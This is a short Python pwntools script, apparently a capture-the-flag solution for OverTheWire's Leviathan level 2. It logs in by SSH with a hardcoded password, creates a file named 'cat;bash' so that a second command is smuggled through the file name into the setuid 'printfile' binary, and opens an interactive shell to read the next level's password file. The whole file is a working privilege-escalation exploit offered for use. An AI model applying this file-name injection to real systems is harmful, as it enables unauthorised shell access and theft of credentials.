from pwn import *
import re
username = "leviathan2"
password = "ougahZi8Ta"
host = "leviathan.labs.overthewire.org"
port = 2223

shell = ssh(username, host, password=password, port=port)
p = shell.run('sh')
p.sendline('touch /tmp/"cat;bash"')
p.sendline("./printfile /tmp/cat\;bash 2>/dev/null")
log.warn("RUN THE COMMAND 'cat /etc/leviathan_pass/leviathan3'")
p.interactive()

p.close()
